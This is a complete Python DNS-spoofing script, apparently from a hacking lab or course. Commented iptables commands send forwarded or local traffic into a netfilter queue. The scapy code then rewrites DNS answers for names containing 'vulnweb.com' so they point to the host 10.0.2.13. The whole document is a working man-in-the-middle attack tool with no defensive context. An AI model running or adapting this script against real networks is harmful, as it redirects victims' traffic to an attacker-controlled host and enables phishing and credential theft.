# Targeting a remote computer
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

# Testing on the local computer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush


import netfilterqueue
import scapy.all as sc


def process_packet(packet):
    scapy_packet = sc.IP(packet.get_payload())
    if scapy_packet.haslayer(sc.DNSRR):
        qname = scapy_packet[sc.DNSQR].qname
        qname = qname.decode()
        if 'vulnweb.com' in qname:
            print(f'[+] Spoofing target > {qname}')
            answer = sc.DNSRR(rrname=qname, rdata='10.0.2.13')
            scapy_packet[sc.DNS].an = answer
            scapy_packet[sc.DNS].ancount = 1
            del scapy_packet[sc.IP].len
            del scapy_packet[sc.IP].chksum
            del scapy_packet[sc.UDP].len
            del scapy_packet[sc.UDP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
